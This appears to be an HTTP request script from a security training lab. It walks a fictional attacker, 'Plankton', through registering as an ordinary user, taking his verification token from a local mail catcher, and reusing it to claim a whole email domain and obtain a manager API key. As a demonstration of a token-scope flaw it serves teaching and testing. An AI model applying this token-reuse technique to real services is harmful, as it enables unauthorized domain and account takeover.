# @import ../common/setup.http
@host = {{base_host}}/v306
@mailpit = http://127.0.0.1:8025/api/v1

# Plankton discovers he can claim any domain by registering as a regular user

### Step 1: Plankton registers as a regular user at bmail.sea
POST /auth/register
Content-Type: application/json

{
    "email": "plankton@bmail.sea"
}


### Step 2: Get the verification email (sent to plankton@, not admin@)
GET {{mailpit}}/messages?limit=1

@email_id = {{response.parsedBody.messages[0].ID}}
?? js response.parsedBody.messages[0].To[0].Address == plankton@bmail.sea


### Step 3: Extract the USER verification token
GET {{mailpit}}/message/{{email_id}}

@user_token = {{response.parsedBody.Text.match(/token=([a-zA-Z0-9\-_.]+)/)[1]}}


### Step 4: EXPLOIT - Use USER token to claim the DOMAIN
# Token is for plankton@ but we're claiming the entire domain bmail.sea
POST /restaurants
Content-Type: application/json

{
    "name": "Plankton's Evil Empire",
    "domain": "bmail.sea",
    "token": "{{user_token}}"
}

?? status == 201
?? js response.parsedBody.api_key != null


### Plankton now owns the bmail.sea domain!
# He can see all users with @bmail.sea emails and gets a manager API key
